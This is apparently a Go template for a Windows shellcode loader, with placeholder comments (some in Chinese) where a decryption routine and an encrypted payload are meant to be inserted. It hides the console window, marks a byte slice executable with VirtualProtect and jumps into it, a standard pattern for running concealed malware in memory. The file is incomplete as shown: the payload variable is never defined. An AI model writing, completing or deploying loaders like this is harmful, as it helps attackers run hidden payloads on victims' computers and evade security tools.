package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)

func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__
	// 复制shellcode到f
	f := func(){}
	*(**uintptr)(unsafe.Pointer(&f)) = (*uintptr)(unsafe.Pointer(&byteSlice))
	var oldfperms2 uint32
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	VirtualProtect.Call(
		uintptr(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&byteSlice)))),
		uintptr(uint(len(byteSlice))),
		uintptr(uint32(0x20)),
		uintptr(unsafe.Pointer(&oldfperms2)))
    f()
}